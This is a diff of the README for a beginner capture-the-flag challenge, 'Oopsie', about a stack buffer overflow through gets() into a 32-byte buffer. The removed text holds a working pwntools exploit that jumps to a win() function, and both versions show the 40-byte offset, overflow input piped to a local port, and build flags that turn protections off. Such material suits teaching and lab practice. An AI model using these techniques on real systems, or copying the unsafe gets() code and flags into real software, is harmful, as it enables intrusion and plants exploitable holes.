@@ -1,93 +1,102 @@
-# Oopsie - Stack Buffer Overflow Challenge
+# Challenge 01: Oopsie - Buffer Overflow Basics
 
-## Challenge Description
+**Difficulty**: ★☆☆☆☆ Beginner  
+**Binary**: `oopsie`  
+**Port**: 1337  
+**Category**: Memory Corruption / Stack Buffer Overflow
 
-A simple C program with a classic stack-based buffer overflow vulnerability. The program uses `gets()` to read user input into a fixed-size buffer without bounds checking, allowing an attacker to overwrite the return address and redirect execution to a `win()` function that reveals the flag.
+## Description
 
-## Vulnerability
+A simple program that asks for your name using the vulnerable `gets()` function. The buffer is only 32 bytes, but `gets()` has no bounds checking.
 
-- **Function**: `vulnerable()`
-- **Issue**: Uses `gets(buffer)` which does not perform bounds checking
-- **Buffer size**: 32 bytes
-- **Protection**: None (compiled with `-fno-stack-protector -z execstack -no-pie`)
+## Source Code Analysis
 
-## Files
-
-- `main.c` - Source code
-- `Makefile` - Build configuration with exploit-friendly flags
-- `flag.txt` - Flag file (read by win function)
-- `Dockerfile` - Multi-stage Docker build
-- `docker-compose.yml` - Easy deployment
-- `entrypoint.sh` - Socat wrapper for network exposure
-
-## Building & Running
-
-### Using Docker Compose (Recommended)
-```bash
-docker-compose up --build -d
+```c
+void vulnerable(void)
+{
+    char buffer[32];        // 32-byte buffer on stack
+    printf("Enter your name: ");
+    gets(buffer);           // NO BOUNDS CHECKING!
+    printf("Hello %s\n", buffer);
+}
 ```
 
-### Using Docker directly
-```bash
-docker build -t oopsie .
-docker run -d -p 1337:1337 --name oopsie oopsie
-```
+### Vulnerability
 
-### Local compilation
-```bash
-make
-./Oopsie
-```
+- `buffer` is 32 bytes
+- `gets()` reads until newline/EOF with no limit
+- Excess input overwrites saved RBP (8 bytes) and saved RIP (8 bytes)
+- Total offset to RIP: 32 + 8 = 40 bytes
 
-## Connecting to the Challenge
+## Binary Protections
 
 ```bash
-nc localhost 1337
+$ checksec --file=oopsie
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
 ```
+
+- **No stack canary** (-fno-stack-protector)
+- **No PIE** (-no-pie) - addresses are static
+- **NX enabled** - stack not executable (default)
 
 ## Exploitation
 
-The goal is to overflow the 32-byte buffer and overwrite the return address to jump to the `win()` function.
+Since there's no `win()` function, the goal is to crash the program. The wrapper script (`run.sh`) detects a segmentation fault (exit code 139) and prints the flag.
 
-1. Find the offset to the return address (32 bytes buffer + 8 bytes saved RBP = 40 bytes on x64)
-2. Find the address of `win()` function
-3. Send payload: `padding + address_of_win`
+### Crash the Program
 
-### Example Exploit (Python)
-```python
-from pwn import *
-
-context.arch = 'amd64'
-
-# Local testing
-# p = process('./Oopsie')
+```bash
+# Local
+python3 -c "print('A' * 50)" | ./oopsie
 
 # Remote
-p = remote('localhost', 1337)
+python3 -c "print('A' * 50)" | nc localhost 1337
+```
 
-# Get win function address
-elf = ELF('./Oopsie')
-win_addr = elf.symbols['win']
+### Understanding the Stack Layout
 
-# Offset: 32 bytes buffer + 8 bytes RBP = 40 bytes
-payload = b'A' * 40 + p64(win_addr)
+```
+High Addresses
+|------------------------|
+| Saved RIP (8 bytes)    |  <-- Overwrite this to control execution
+|------------------------|
+| Saved RBP (8 bytes)    |  <-- Overwritten with padding
+|------------------------|
+| buffer[32] (32 bytes)  |  <-- gets() writes here
+|------------------------|
+Low Addresses
+```
 
-p.sendline(payload)
-p.interactive()
+Offset to RIP = 32 (buffer) + 8 (RBP) = **40 bytes**
+
+### Verify with GDB
+
+```bash
+gdb ./oopsie
+(gdb) run
+# Enter 50 'A's
+(gdb) info registers
+# Check RIP = 0x4141414141414141
 ```
 
 ## Flag
 
-The flag is stored in `flag.txt` and printed by the `win()` function when successfully exploited.
+The flag is printed automatically when the program crashes (segfault).
 
-Format: `0XATTACK{...}`
+## Key Concepts Learned
 
-## Security Notes
+- Stack memory layout
+- Buffer boundaries and overflow
+- Segmentation faults from corrupted RIP
+- Why `gets()` is dangerous
+- Little-endian byte order
 
-This challenge is intentionally vulnerable for educational purposes. The binary is compiled with:
-- No stack canaries (`-fno-stack-protector`)
-- Executable stack (`-z execstack`)
-- No PIE (`-no-pie`)
-- No RELRO (default)
+## Progressive Hints
 
-These settings make exploitation straightforward and are typical for beginner CTF challenges.
+1. What happens with 33 characters? 40? 48? 60?
+2. Run in GDB, send 60 'A's, check `info registers`
+3. What's stored after `buffer` on the stack? How does the function know where to return?
